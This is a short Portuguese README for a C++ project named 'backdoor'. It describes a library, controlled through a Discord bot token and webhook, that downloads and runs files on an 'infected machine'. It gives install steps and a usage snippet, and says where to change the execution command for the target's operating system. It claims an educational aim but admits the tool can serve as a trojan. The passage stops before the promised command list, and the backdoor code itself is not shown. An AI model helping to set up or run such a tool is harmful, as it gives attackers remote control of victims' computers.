# backdoor
Esse projeto é uma api pública para fins educacionais que é bem parecida com um backdoor.
Você utiliza ela, provavelmente, com o seu programa e terá acesso ao download e execução de arquivos na máquina infectada! 
Isso abre portas para ser um trojan, mas o intuito desse projeto não é esse. Logo abaixo, ensino a como configurar junto de seu aplicativo.

1- Instalações da depedencias:
        Esse programa precisa de DPP e Curl para usar esse projeto. Caso esteja no arch linux, por exemplo, você pode facilmente baixa-los usando AUR: yay -S dpp curl. 

2- Usando o backdoor no código:
        
// codigo

    
    int main(){
      
      std::string token = " o token do seu bot aqui ";
      const std::string& webhook_url = " o web hook do seu bot para usar como log ";
      const std::string version;
      
      network program(token, webhook_url, version);
      program.MAIN();
      program.perfomBot();
  
  
  
  
      return 0;
    }
  
// fim do codigo

OBS: não necessariamente é assim e não conferi se realmente está correto, mas bem possivel que funcione, pois esse é a estrutura do uso.
ATENÇÃO: dependendo do sistema operacional do computador do alvo for, o comando de execução dp aplicativo baixado tem que ser alterado. 
O padrão de execução está no tipo windows, "start", e para mudar, você encontrará no arquivo "network.hpp", na linha 64.


Logo abaixo, ensino alguns comandos basicos para usar ele
